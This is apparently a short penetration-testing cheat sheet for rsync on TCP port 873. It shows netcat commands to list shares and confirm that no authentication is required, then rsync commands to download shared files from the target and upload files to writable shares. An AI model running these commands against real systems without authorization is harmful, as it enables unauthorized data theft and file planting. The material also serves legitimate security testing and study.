# RSync
Rsync is a Linux-based tool that can be used to sync files between remote and local servers. Rsync has many options that can help you define the connections you make.
If TCP port 873 rsync is open, try the steps below for enumeration and exploitation.

### Enumeration
Use netcat to connect to the remote address and attempt to list shares
```
nc <target-ip> 873
@RSYNCD: 29.0             <-- This will be returned to you upon connect
@RSYNCD: 29.0             <-- Send this back
#list                     <-- Then enter this
Share1                    <-- A list of shares should be returned
Share2
...
```
Once rsync spits out the shares, the netcat session will close. Open another session to further enumerate
```
nc <target-ip> 873
@RSYNCD: 29.0
@RSYNCD: 29.0
Share1                  <-- Enter the share name
@RSYNCD: OK             <-- No authentication is required
```

### Exploit
If authentication isn't required by rsync, you can download files from the remote host and possible upload files

To list out the directory use:\
`rsync rsync://<target-ip:port>/shared_name`

Copy shared files to local host:\
`rsync -av rsync://<target-ip:port>/shared_name ./rsync_shared`

If the directory allows global write, write a file with:\
`rsync -avz local/filename rsync://<target-ip:port>/shared_name`
